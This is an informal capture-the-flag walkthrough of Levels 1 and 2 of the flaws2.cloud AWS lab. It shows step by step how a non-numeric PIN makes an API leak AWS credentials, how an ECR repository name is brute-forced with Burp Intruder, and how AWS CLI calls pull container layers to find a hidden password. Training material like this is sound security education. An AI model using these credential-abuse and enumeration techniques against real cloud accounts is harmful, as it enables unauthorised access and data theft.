# `Defender Track`

http://flaws2.cloud/defender.htm

<br><br><br>

# `Attacker Track`

<br>

# Level 1

1. From the first page (dont click hint yet!) inspect the form using your browser's developer tools. You will see that the html form tag actually contains the API link where the form values will be submitted.
2. Use the link that you found and pass on the code value

   ```
   link?code=1234
   ```

3. While I tried this should be the right way of things... I felt cheated as you will NEVER gonna get to the right link unless you've clicked the hint.
4. Click the hint. Read the statement CAREFULLY!!!
5. There is TRICK in the statement, while I've generated the some JSON data from just trying out a few values (and yes i tried a 100-char value), the next step is very ambigous. His statement is: `Get around it and pass a pin code that isn't a number`
   - he meant the letter a as the pin code literally
   - and again, I believe (or maybe i'm just ranting coz i suck) you cannot get to the next step unless you get this hint
6. Finally, after all that rant... pass in the link that you got from the HTML form tag with the code value a

   ```
   link?code=a
   ```

   Stupid right?

7. Then you will be sent to a page with a json data dump. Note that you will see different output depending with the browser that you are using. If you are using chrome, you will see the raw data dump right away... if you are using firefox... dont cry!... just click the RAW DATA tab to see the json raw data.
8. Because you and I are not robots, unless you are awesome at reading one-liners... go to https://www.beautifyjson.org/ >> paste the raw data and you will see that the API dumped you some AWS credentials
9. In your terminal, configure this user using:

   ```
   aws configure --profile name
   ```

   and enter the access key id and access secret key... because you got a session token, you might as well enter this in your credential file within your aws folder. (if you dont know how to do this, check out FLAWS1 Level5).

10. While I did say to do it, I just realised that you dont need it to view the directory content of the S3 bucket.
11. View the bucket using:

   ```
   aws s3 ls s3://level1.flaws2.cloud
   ```

Voila!

<br><br><br>

# Level 2

1. Right let's spin this DJ! So clicked into first hint and found out that this is an ECR. Went back to Stephane Maarek's course and re-learned the ECR modules.
2. To use the command in the HINT, we will need two things...
   - 1st is the --registry-id (thankfully we've done this in FLAWS1)
   - 2nd the name of the repo (since there isn't anymore hints after the 1st one, it could be deliberate) we will brute force this with the help of BurpSuite
3. Using the user account details from Level 1 (FLAWS2)... we will issue the command:
   ```
   aws --profile 2L1V2 sts get-caller-identity
   ```
   then the output should be a json data format with:
   ```
   {
       "UserId": "AROAIBATWWYQXZTTALNCE:level1",
       "Account": "653711331788",
       "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
   }
   ```
4. Great! We now have the (key) --registry-id value. Now let's bruteforce (I'm trying to make it sound cool but all I'm doing is using Burp Intruder to trial and error a few words)
5. Go to AWS CLI
6. Make sure you proxy is set to burp >> Intercept off
7. Run an initial call from the AWS CLI (cloudshell) so that you can capture the POST requests and manipulate the data
8. Key in payload in intruder (repo, flaws2.cloud, flaws2, level1, level2, level2_flaws2, flaws2level2, flaws2_level2)
9. As it turns out, I am not entirely so unlucky!!! I hit jackpot on the 5th key:value pair (winning!)
10. So... we now know the repo's name is level2... let's run the command from the hint:
    ```
    aws ecr list-images --repository-name level2 --registry-id 653711331788 --profile 2L1V2
    ```
    we will then get the image hash
    ```
    {
        "imageIds": [
            {
                "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
                "imageTag": "latest"
            }
        ]
    }
    ```
11. Let's go back to Stephane's course module... ok! Because I do not understand docker (dont judge!)... we will use cloudshell
12. The AWS CLI ECR documentation comes in handy... lots of reading, lots of trying to understand shit (atleast pretending)
13. Let's invoke this command
    ```
    aws --profile 2L1V2 ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest
    ```
14. Right-o! We are getting somewhere... we got a json data dump again...
    ```
    {
        "images": [
            {
                "registryId": "653711331788",
                "repositoryName": "level2",
                "imageId": {
                    "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
                    "imageTag": "latest"
                },
                "imageManifest": "{\n   \"schemaVersion\": 2,\n   \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\",\n   \"config\": {\n      \"mediaType\": \"application/vnd.docker.container.image.v1+json\",\n      \"size\": 5359,\n      \"digest\": \"sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621\"\n   },\n   \"layers\": [\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 43412182,\n         \"digest\": \"sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 848,\n         \"digest\": \"sha256:ab4d1096d9ba178819a3f71f17add95285b393e96d08c8a6bfc3446355bcdc49\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 619,\n         \"digest\": \"sha256:e6797d1788acd741d33f4530106586ffee568be513d47e6e20a4c9bc3858822e\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 168,\n         \"digest\": \"sha256:e25c5c290bded5267364aa9f59a18dd22a8b776d7658a41ffabbf691d8104e36\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 32516034,\n         \"digest\": \"sha256:96af0e137711cf1b2bf6e95528fbf861b2beef58c382bdadcf8062851e7005bb\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 217,\n         \"digest\": \"sha256:2057ef5841b5bc57c66088d7d99898e6b7a516feaf2e66a7a4c69e6b40a03472\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 619,\n         \"digest\": \"sha256:e4206c7b02ec71b1262ad18216e1203da19e5292fcf636392e0ed969871bb235\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 893,\n         \"digest\": \"sha256:501f2d39ea313392ab1e2b4b6b7d9213c60335d3c508fc02b3bdae9792ae2d32\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 508,\n         \"digest\": \"sha256:f90fb73d877d9ce2e2220a1340d2e347b0c7baa2d120ce02c8731d666cdb1cac\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 213,\n         \"digest\": \"sha256:4fbdfdaee9ae20c6e877bd57838c6f93336573195f4aafcdec36fb4c4358a935\"\n      }\n   ]\n}",
                "imageManifestMediaType": "application/vnd.docker.distribution.manifest.v2+json"
            }
        ],
        "failures": []
    }
    ```
15. Again, I am not a robot... let's pull up https://www.beautifyjson.org/ and prettify this json data
16. So we now have the imageDigest key and hashed value... let's look into https://docs.aws.amazon.com/cli/latest/reference/ecr/get-download-url-for-layer.html
17. Let's try and download each one and see if we get something cool:

    ```
    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:ab4d1096d9ba178819a3f71f17add95285b393e96d08c8a6bfc3446355bcdc49" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:e6797d1788acd741d33f4530106586ffee568be513d47e6e20a4c9bc3858822e" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:e25c5c290bded5267364aa9f59a18dd22a8b776d7658a41ffabbf691d8104e36" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:96af0e137711cf1b2bf6e95528fbf861b2beef58c382bdadcf8062851e7005bb" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:2057ef5841b5bc57c66088d7d99898e6b7a516feaf2e66a7a4c69e6b40a03472" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:e4206c7b02ec71b1262ad18216e1203da19e5292fcf636392e0ed969871bb235" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:501f2d39ea313392ab1e2b4b6b7d9213c60335d3c508fc02b3bdae9792ae2d32" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:f90fb73d877d9ce2e2220a1340d2e347b0c7baa2d120ce02c8731d666cdb1cac" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:4fbdfdaee9ae20c6e877bd57838c6f93336573195f4aafcdec36fb4c4358a935" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e" --repository-name level2 --registry-id 653711331788
    ```

18. Because I am evil, I also wish you to suffer as I have when I called each one of this files... you will later find out (as I did) that you only need the one that is not a tar.gzip file :joy: ...
19. In the ocean of data inside that you just opened (and once you prettify that data)... you will see something curious that says password!!! hahaha... I won't spoil it... go and find it!
20. Ok... you might be asking yourself... I have a username and a password... what next? A great man once said "when lost, it is wise to start from the beginning"
21. That's right, there is a link from the beginning of Level 2 where you will plug that creds in.

`Note:` I would like to add how proud I am with myself in performing Level2... I did this with nothing but a hint that it is using the ECR technology of AWS... everything else is based on the AWS course modules and the AWS CLI documentation. I would also like to stress the importance of reading this documentation. I think it is impossible to interact with the AWS CLI without this document.

`Edit` I found that my proxy was causing the 404... there are indeed a good number of hints for Level 2... I did not retract my first NOTE because I am still proud that I did the whole Level 2 without looking at any of them.
